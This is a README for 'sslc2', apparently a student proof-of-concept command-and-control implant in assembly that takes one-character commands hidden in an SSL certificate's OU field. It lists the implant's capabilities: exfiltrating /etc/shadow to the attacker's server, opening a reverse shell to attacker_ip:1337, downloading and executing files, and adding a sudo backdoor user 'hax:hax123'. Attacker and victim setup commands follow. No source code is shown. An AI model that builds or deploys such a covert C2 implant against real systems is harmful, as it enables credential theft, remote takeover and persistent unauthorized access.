## sslc2
Simple C&C example in assembly that retrieves commands from the Organizational Unit (OU) field in an SSL certificate. Definitely far from being really done, but a cool proof-of-concept. This was my final project for CSC 314 @ DSU.

## Supported Options:
In order to make the attacker's host look inconspicuous, the commands are found in the OU field and only contain 1 character that represents certain actions. The supported actions are:

- Steal `/etc/shadow`, will be posted & saved to our server
- Spawn a reverse shell; reverse shell is sent to attacker_ip:1337
- Download, change perms & execute file/binary. 
- Create a new user. This creates a new user with sudo permissions with the credentials: hax:hax123

## Setup:
**Attacker Server**:
- install golang
- install python

```
ubuntu@attacker:~$ ./gencert.py your.domain

1: steal /etc/shadow
2: spawn reverse shell
3: download & execute script
4: create new user

option > 1

ubuntu@attacker:~$ go build server.go
ubuntu@attacker:~$ sudo ./server
```

**Victim Server**:
```
root@victim:~$ cd cnc && make
root@victim:~$ ./cnc
```
